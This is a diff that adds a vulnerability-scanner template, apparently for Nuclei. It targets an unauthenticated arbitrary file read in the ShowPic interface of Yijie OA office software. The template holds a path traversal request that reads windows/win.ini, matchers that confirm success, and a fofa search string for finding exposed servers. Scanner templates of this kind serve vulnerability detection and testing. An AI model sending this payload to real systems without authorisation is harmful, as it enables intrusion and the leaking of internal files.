@@ -1,0 +1,37 @@
+id: yijie-oa-fileread
+
+info:
+  name: Yijie OA - File Read
+  author: qwtd
+  severity: medium
+  description: |
+    易捷OA协同办公软件 ShowPic 接口处任意文件读取漏洞，未经身份验证的攻击者可以利用此漏洞读取系统内部配置文件，造成信息泄露，导致系统处于极不安全的状态。
+    fofa: body="/images/logon/bg_img.jpg"
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%98%93%E6%8D%B7OA/%E6%98%93%E6%8D%B7OA%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E8%BD%AF%E4%BB%B6ShowPic%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md
+  metadata:
+    verified: true
+  tags: 易捷OA
+
+http:
+  - raw:
+      - |
+        GET /servlet/ShowPic?filePath=../../windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
+      - type: status
+        status:
+          - 200
